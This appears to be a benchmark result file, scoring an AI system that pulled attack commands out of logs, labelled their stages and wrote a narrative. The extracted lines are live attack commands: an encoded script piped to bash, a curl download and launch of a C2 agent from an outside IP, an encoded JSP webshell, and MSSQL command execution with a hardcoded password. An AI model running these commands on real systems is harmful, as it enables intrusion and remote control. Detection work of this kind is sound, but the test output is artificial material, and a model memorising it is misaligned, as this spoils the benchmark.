@@ -1,0 +1,104 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "base64 -d",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ifconfig",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ping -c 1 10.67.200.200",
+        "stage": "Discovery"
+      },
+      {
+        "command": "arp -a",
+        "stage": "Discovery"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Persistence"
+      },
+      {
+        "command": "./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c echo PCUhIFN0cmluZyBpRWhEbFhkeUIgPSBuZXcgU3RyaW5nKG5ldyBTdHJpbmcobmV3IGJ5dGVbXXsgMTEsfSkpOyU+PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT4NCjwlY2xhc3MvKiovJT48JVUlPjwlZXh0ZW5kcyU+PCVDbGFzc0xvYWRlcntVJT48JShDbGFzc0xvYWRlciBjKSU+PCV7c3VwZXIoYyk7JT48JX0lPjwlcHVibGljJT48JUNsYXNzJT48JWcoYnl0ZSU+PCVbLyoqL11iKXtyZXR1cm4lPjwlc3VwZXIuJT48JWRlZmluZUNsYXNzJT48JSglPjwlYiU+PCUsMCwxLGIuJT48JWxlbmd0aCk7fX0lPjwlISU+PCVpZiU+PCUocmVxdWVzdC4lPjwlZ2V0TWV0aG9kKCU+PCUpLiU+PCVlcXVhbHMoJT48JSJQT1NUIiU+PCUpKSU+PCV7U3RyaW5nJT48JWs9ImU0NWUzMjlmZWI1ZDkyNWIiOyU+PCVzZXNzaW9...[truncated, 1233 chars total]",
+        "stage": "Execution"
+      },
+      {
+        "command": "sh -c ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "sqltool_amd64_upx --server 192.168.0.0/24 --user sa --password Sa123456 --enable",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "An attacker initially accessed the system through an unknown vector via a bash command decoding a base64 string containing another bash script, which executed various commands to gather information about the system such as IP address, hostname, and username. The attacker downloaded and installed malware named sandcat-linux using curl and made it executable. Further investigation revealed lateral movement attempts using SQLTool to scan for vulnerable Microsoft SQL servers within the local subnet and execute arbitrary commands on those servers.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19881,
+      "completion_tokens": 1023,
+      "total_tokens": 20904,
+      "wall_clock_s": 35.882,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.6153846153846154,
+      "recall": 0.7272727272727273,
+      "f1": 0.6666666666666667,
+      "tp": 8,
+      "fp": 5,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.07692307692307693,
+      "recall": 0.14285714285714285,
+      "f1": 0.1,
+      "tp": 1,
+      "fp": 12,
+      "fn": 6,
+      "recall_partial": 0.35714285714285715
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19881,
+      "completion_tokens": 1023,
+      "total_tokens": 20904,
+      "wall_clock_s": 35.882,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v3",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": false,
+    "got_link_hints": false
+  }
+}
